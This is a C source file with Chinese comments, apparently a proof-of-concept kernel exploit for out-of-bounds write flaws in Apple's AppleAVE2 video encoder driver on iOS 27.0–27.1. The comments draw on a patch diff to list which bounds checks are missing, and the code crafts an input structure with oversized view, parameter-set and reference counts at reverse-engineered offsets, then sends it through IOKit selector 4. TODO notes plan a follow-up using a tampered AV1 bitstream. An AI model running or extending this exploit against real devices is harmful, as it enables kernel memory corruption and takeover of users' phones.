// ave_av1_oob.c — 目标 CVE-2026-112466/468/469/470/705/689 (iOS 27.0–27.1)
//
// fix-diff 结论（IDA，27.1 913.43.1 → 27.2 913.64.1, com.apple.driver.AppleAVE2）:
//   dispatch: sub_FFFFFE0008820E00(ctx, params)  switch (params[22])      // +0x58 = codec type
//       1 → AVE_Client_CheckInfo_AVC
//       2 → AVE_HEVC_CheckVPS...      (27.2 新增校验)
//       3 → AVE_AV1_CheckInfo  @0xfffffe0008820a00   // 27.2 新增
//   新增断言示例（27.2）:
//       "view number is out of range %d %d (%d, %d]"            ← params[25] (+0x64)
//       "HEVC PPS count is out of range" / "AVC log2_max is out of range"
//       "MCTF strength count out of range" / "iRefNum is out of range"
//   27.1 无这些上界检查 → 计数直接参与 size/循环计算 → 内核 OOB write。
//
// 服务名: AppleAVE2Driver / 客户端: AppleAVE2UserClient
//
// build: clang -O2 -o ave_oob ave_av1_oob.c -framework IOKit -framework CoreFoundation
//
// 说明：selector 号与结构体完整布局仍需在 IDA 里核对外部方法表（见 TODO-1/2），
// 校验函数本身已在 diff 中定位，字段偏移可信。

#include <stdio.h>
#include <string.h>
#include <IOKit/IOKitLib.h>

#define CODEC_AVC 1
#define CODEC_HEVC 2
#define CODEC_AV1 3

// 偏移推导链（27.2 反编译，已确证）：
//   sel4 handler:  X25 = *(args + 0x30)  = structureInput  (用户缓冲区)
//                  W26 = *(args + 0x38)  = structureInputSize
//                  CMP W26,#0x1F / CMP W26,(0x12C10-1)  → 大小校验
//                  Prepare(client, a2 = X25, a3 = structureOutput)
//   Prepare:       X20 = a2 = 用户缓冲区
//                  0x882a694(client->0x160, X20+0x18, X20+0x228, X20+0x338, X20+0x28)
//                  第一个参数 X20+0x18 = codec params 结构体
//   CheckInfo:     codec_type = *(u32*)(params + 0x58)  → 用户偏移 0x18+0x58 = 0x70
//                  view_num   = *(u32*)(params + 0x64)  → 用户偏移 0x18+0x64 = 0x7C
#pragma pack(push, 4)
struct ave_params {
    uint8_t  pad0[0x70];
    uint32_t codec_type;        // 用户偏移 0x70（params+0x58）dispatch 用：1=AVC 2=HEVC 3=AV1
    uint32_t pad1;
    uint32_t view_num;          // 用户偏移 0x7C（params+0x64）27.2 检查 0 < x <= 2
    uint32_t pad2[8];
    uint32_t pps_count;         // TODO-2: 偏移按 codec 分支核对（HEVC/AVC 分支引用）
    uint32_t sps_count;
    uint32_t rps_count;
    uint32_t log2_max;          // AVC log2_max_minus4 类字段
    uint32_t mctf_strength_count;
    uint32_t iref_num;
    uint8_t  tail[0x400];
};
#pragma pack(pop)
#define AVE_STRUCT_IN_SIZE 0x12C10u

static io_connect_t open_ave(void) {
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
                            IOServiceMatching("AppleAVE2Driver"));
    if (!svc) { fprintf(stderr, "AppleAVE2Driver not found\n"); return 0; }
    io_connect_t c = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &c);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) { fprintf(stderr, "IOServiceOpen kr=0x%x\n", kr); return 0; }
    return c;
}

int main(void) {
    io_connect_t c = open_ave();
    if (!c) return 1;

    struct ave_params p;
    memset(&p, 0, sizeof(p));

    // 1) AV1 分支：view_num 越界（27.2 会拒，27.1 会带着越界值继续算）
    p.codec_type = CODEC_AV1;
    p.view_num   = 0x40;         // 合法域 (0,2]，喂 64 → 27.1 用其算 buffer/循环

    // 2) 27.2 才校验的字段（用户缓冲区偏移，见 AVE_OFFSETS.md）
    //    这里用原始指针写，保证偏移精确（结构体字段顺序不代表真实布局）
    {
        uint8_t *b = (uint8_t *)&p;
        *(uint32_t *)(b + 0x7C) = 0x40;   // view number   (params+0x64)
        *(uint32_t *)(b + 0x80) = 0x40;   // layer number  (params+0x68)
        *(uint32_t *)(b + 0x510) = 0x10000; // AV1 frame dimension (params+0x4F8)
        *(uint32_t *)(b + 0xE88) = 0x1000;  // AV1 MCTF strength count (params+0xE70)
        *(uint16_t *)(b + 0x18AE) = 0xFFF0; // AVC frame dimension (u16)
        *(uint16_t *)(b + 0x18B6) = 0xFFF0; // AVC log2_max (u16)
    }

    // 3) 计数类字段一起放大：让驱动按计数分配/拷贝
    p.pps_count = 0x1000;
    p.sps_count = 0x1000;
    p.rps_count = 0x1000;
    p.log2_max  = 0xff;          // 27.2: "log2_max is out of range (max %d)"
    p.mctf_strength_count = 0x1000;
    p.iref_num  = 0xffff;

    // sel4 已反解（dispatch @0x8965a08，表 @0x7fe18d0）；备选 sel5 (0x12c20)
    //         IDA: 找 IOUserClient::externalMethod 或 selector 比较链（up-chain 已定位
    //         sub_FFFFFE000882b0d0 → 882a694 → 8824cc4 → 8824338 → 8820E00）
    const uint32_t SELECTOR_CREATE_SESSION = 4;   // 已确认：struct_in=0x12c10，走 CheckCodecInfo
    // 驱动校验要求 structureInputSize 精确匹配 0x12C10
    static uint8_t blob[AVE_STRUCT_IN_SIZE];
    memset(blob, 0, sizeof(blob));
    memcpy(blob, &p, sizeof(p));

    size_t outsz = 0;
    uint64_t out = 0;
    kern_return_t kr = IOConnectCallStructMethod(c, SELECTOR_CREATE_SESSION,
                                                 blob, AVE_STRUCT_IN_SIZE, &out, &outsz);
    printf("kr=0x%x out=0x%llx\n", kr, (unsigned long long)out);

    // 3) 若第一发只走到参数校验，换成真正下码流的 selector：
    //    TODO-2: 定位 "decode frame / submit bitstream" 的 external method，
    //    用真 AV1 码流 + 篡改后的 frame header 计数（Hcamael 那 4 条就在这条路上）
    IOServiceClose(c);
    return 0;
}
